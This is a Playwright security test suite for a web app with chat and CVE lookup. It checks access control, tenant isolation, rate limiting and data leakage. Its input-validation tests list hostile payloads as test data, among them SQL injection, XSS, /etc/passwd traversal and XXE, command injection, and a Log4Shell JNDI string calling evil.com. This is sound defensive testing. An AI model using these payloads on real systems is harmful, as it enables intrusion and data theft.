import { test, expect } from '@playwright/test';

test.describe('Penetration Testing Suite', () => {
  test.describe('API Security Checklist', () => {
    test('should enforce authentication on all protected endpoints', async ({ request }) => {
      const protectedEndpoints = [
        '/api/conversations',
        '/api/documents',
        '/api/escalations',
        '/api/admin/users',
        '/api/admin/analytics',
        '/api/consultants',
        '/api/cve/cache',
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request.get(endpoint);
        expect([401, 403]).toContain(response.status());
      }
    });

    test('should prevent privilege escalation attacks', async ({ request, page }) => {
      // Login as regular user
      await page.goto('/auth');
      await page.fill('[data-testid="email-input"]', 'user@example.com');
      await page.fill('[data-testid="password-input"]', 'password123');
      await page.click('[data-testid="login-button"]');
      await page.waitForURL('/dashboard');

      // Extract session token
      const cookies = await page.context().cookies();
      const authToken = cookies.find((c) => c.name.includes('auth'))?.value;

      // Attempt to access admin endpoints with user token
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/system',
        '/api/admin/security',
        '/api/admin/analytics',
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request.get(endpoint, {
          headers: { Authorization: `Bearer ${authToken}` },
        });
        expect(response.status()).toBe(403);
      }
    });

    test('should prevent horizontal privilege escalation', async ({ request, page }) => {
      // Test data isolation between users
      await page.goto('/auth');
      await page.fill('[data-testid="email-input"]', 'user1@example.com');
      await page.fill('[data-testid="password-input"]', 'password123');
      await page.click('[data-testid="login-button"]');
      await page.waitForURL('/dashboard');

      // Try to access another user's data by manipulating IDs
      const maliciousRequests = [
        '/api/conversations?user_id=different-user-id',
        '/api/documents?user_id=another-user',
        '/api/escalations?user_id=00000000-0000-0000-0000-000000000000',
      ];

      for (const endpoint of maliciousRequests) {
        const response = await request.get(endpoint);
        const data = await response.json();

        // Should return empty results or access denied
        if (response.ok()) {
          expect(data.length || 0).toBe(0);
        } else {
          expect([401, 403]).toContain(response.status());
        }
      }
    });

    test('should validate all input parameters', async ({ request }) => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<%=7*7%>',
        '#{7*7}',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const input of maliciousInputs) {
        // Test CVE endpoint
        const cveResponse = await request.get(`/api/cve/${encodeURIComponent(input)}`);
        expect([400, 404]).toContain(cveResponse.status());

        // Test search endpoint if exists
        const searchResponse = await request.get(`/api/search?q=${encodeURIComponent(input)}`);
        expect([400, 404, 405]).toContain(searchResponse.status());
      }
    });
  });

  test.describe('Multi-Tenant Isolation Testing', () => {
    test('should isolate user data between tenants', async ({ browser }) => {
      // Create two separate user sessions
      const context1 = await browser.newContext();
      const context2 = await browser.newContext();
      const page1 = await context1.newPage();
      const page2 = await context2.newPage();

      try {
        // Login as user 1
        await page1.goto('/auth');
        await page1.fill('[data-testid="email-input"]', 'tenant1@example.com');
        await page1.fill('[data-testid="password-input"]', 'password123');
        await page1.click('[data-testid="login-button"]');
        await page1.waitForURL('/dashboard');

        // Login as user 2
        await page2.goto('/auth');
        await page2.fill('[data-testid="email-input"]', 'tenant2@example.com');
        await page2.fill('[data-testid="password-input"]', 'password123');
        await page2.click('[data-testid="login-button"]');
        await page2.waitForURL('/dashboard');

        // Create conversation as user 1
        await page1.goto('/chat');
        await page1.fill('[data-testid="chat-input"]', 'Confidential user 1 message');
        await page1.click('[data-testid="send-button"]');
        await page1.waitForSelector('[data-testid="ai-response"]');

        // User 2 should not see user 1's conversations
        await page2.goto('/chat');
        const messages = await page2.locator('[data-testid="chat-message"]');
        const messageCount = await messages.count();

        if (messageCount > 0) {
          const messageTexts = await Promise.all(
            Array.from({ length: messageCount }, (_, i) => messages.nth(i).textContent()),
          );

          // Should not contain user 1's confidential message
          const hasConfidentialMessage = messageTexts.some((text) =>
            text?.includes('Confidential user 1 message'),
          );
          expect(hasConfidentialMessage).toBe(false);
        }
      } finally {
        await context1.close();
        await context2.close();
      }
    });

    test('should prevent session hijacking', async ({ browser }) => {
      const context1 = await browser.newContext();
      const context2 = await browser.newContext();
      const page1 = await context1.newPage();
      const page2 = await context2.newPage();

      try {
        // Login as user 1
        await page1.goto('/auth');
        await page1.fill('[data-testid="email-input"]', 'user1@example.com');
        await page1.fill('[data-testid="password-input"]', 'password123');
        await page1.click('[data-testid="login-button"]');
        await page1.waitForURL('/dashboard');

        // Get user 1's session cookies
        const cookies = await context1.cookies();

        // Try to use user 1's cookies in user 2's context
        await context2.addCookies(cookies);
        await page2.goto('/dashboard');

        // Should be redirected to login or access denied
        const url = page2.url();
        const isUnauthorized = url.includes('/auth') || url.includes('/login');
        expect(isUnauthorized).toBe(true);
      } finally {
        await context1.close();
        await context2.close();
      }
    });
  });

  test.describe('OWASP ZAP Simulation', () => {
    test('should resist common attack vectors', async ({ page, request }) => {
      await page.goto('/auth');
      await page.fill('[data-testid="email-input"]', 'test@example.com');
      await page.fill('[data-testid="password-input"]', 'password123');
      await page.click('[data-testid="login-button"]');
      await page.waitForURL('/dashboard');

      // Test for common vulnerabilities
      const attackVectors = [
        // Directory traversal
        '../../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',

        // Command injection
        '; cat /etc/passwd',
        '| whoami',
        '`id`',

        // LDAP injection
        '*)(uid=*',
        '*)(&(uid=*',

        // XML injection
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',

        // NoSQL injection
        '{"$ne": null}',
        '{"$gt": ""}',

        // Template injection
        '{{7*7}}',
        '${7*7}',
        '<%=7*7%>',
      ];

      for (const vector of attackVectors) {
        await page.goto('/chat');
        await page.fill('[data-testid="chat-input"]', vector);
        await page.click('[data-testid="send-button"]');

        // Wait for response and check it doesn't execute the attack
        await page.waitForSelector('[data-testid="user-message"]');
        const messageContent = await page.textContent('[data-testid="user-message"]');

        // Attack vector should be rendered as harmless text
        expect(messageContent).toContain(vector);

        // Check for any error indicators that might reveal system info
        const hasErrorMessage = await page.isVisible('[data-testid="error-message"]');
        if (hasErrorMessage) {
          const errorText = await page.textContent('[data-testid="error-message"]');

          // Error should not reveal system details
          expect(errorText).not.toContain('/etc/passwd');
          expect(errorText).not.toContain('root:');
          expect(errorText).not.toContain('Administrator');
          expect(errorText).not.toContain('C:\\');
          expect(errorText).not.toContain('database');
          expect(errorText).not.toContain('SQL');
        }
      }
    });
  });

  test.describe('Rate Limiting and DoS Protection', () => {
    test('should implement rate limiting on authentication', async ({ page }) => {
      await page.goto('/auth');

      // Attempt rapid failed logins
      const failedAttempts = [];
      for (let i = 0; i < 20; i++) {
        const startTime = Date.now();
        await page.fill('[data-testid="email-input"]', 'nonexistent@example.com');
        await page.fill('[data-testid="password-input"]', 'wrongpassword');
        await page.click('[data-testid="login-button"]');
        await page.waitForTimeout(500);

        const endTime = Date.now();
        failedAttempts.push(endTime - startTime);
      }

      // Later attempts should take longer (rate limiting in effect)
      const earlyAttempts = failedAttempts.slice(0, 5).reduce((a, b) => a + b, 0) / 5;
      const laterAttempts = failedAttempts.slice(-5).reduce((a, b) => a + b, 0) / 5;

      expect(laterAttempts).toBeGreaterThan(earlyAttempts);
    });

    test('should protect against API flooding', async ({ request }) => {
      const rapidRequests = Array.from({ length: 100 }, () =>
        request.get('/api/cve/CVE-2021-44228'),
      );

      const responses = await Promise.all(rapidRequests);
      const rateLimitedCount = responses.filter((r) => r.status() === 429).length;

      // Should have some rate limiting
      expect(rateLimitedCount).toBeGreaterThan(0);
    });
  });

  test.describe('Data Exposure Testing', () => {
    test('should not expose sensitive data in responses', async ({ request, page }) => {
      await page.goto('/auth');
      await page.fill('[data-testid="email-input"]', 'test@example.com');
      await page.fill('[data-testid="password-input"]', 'password123');
      await page.click('[data-testid="login-button"]');
      await page.waitForURL('/dashboard');

      // Check various API endpoints for data leakage
      const endpoints = ['/api/conversations', '/api/cve/CVE-2021-44228', '/api/profile'];

      for (const endpoint of endpoints) {
        const response = await request.get(endpoint);
        if (response.ok()) {
          const responseText = await response.text();

          // Should not contain sensitive patterns
          expect(responseText).not.toMatch(/password|secret|key|token/i);
          expect(responseText).not.toContain('-----BEGIN');
          expect(responseText).not.toMatch(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/);
          expect(responseText).not.toMatch(/\b\d{16}\b/); // Credit card patterns
          expect(responseText).not.toMatch(/\b\d{3}-\d{2}-\d{4}\b/); // SSN patterns
        }
      }
    });

    test('should sanitize error messages', async ({ page }) => {
      // Trigger various errors and check messages don't leak info
      await page.goto('/nonexistent-page');

      if (await page.isVisible('[data-testid="error-message"]')) {
        const errorText = await page.textContent('[data-testid="error-message"]');

        // Error should not contain system information
        expect(errorText).not.toContain('/');
        expect(errorText).not.toContain('\\');
        expect(errorText).not.toContain('database');
        expect(errorText).not.toContain('SQL');
        expect(errorText).not.toContain('stack trace');
        expect(errorText).not.toContain('at ');
      }
    });
  });
});
